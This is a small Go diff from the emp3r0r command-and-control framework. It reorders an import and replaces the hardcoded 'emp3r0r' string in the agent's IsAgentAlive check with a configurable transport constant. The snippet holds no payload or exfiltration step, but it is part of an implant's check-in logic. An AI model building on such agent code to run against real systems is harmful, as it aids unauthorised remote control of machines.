@@ -4,12 +4,13 @@ import (
 	"context"
 	"fmt"
 	"io"
-	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"net"
 	"net/url"
 	"os"
 	"os/exec"
 	"strings"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
@@ -55,7 +56,7 @@ func IsAgentAlive(c net.Conn) bool {
 			logging.Printf("Agent told me to die (%d)", os.Getpid())
 			os.Exit(0)
 		}
-		if strings.Contains(resp, "emp3r0r") {
+		if strings.Contains(resp, def.TransportString) {
 			logging.Println("Yes it's alive")
 			return true
 		}
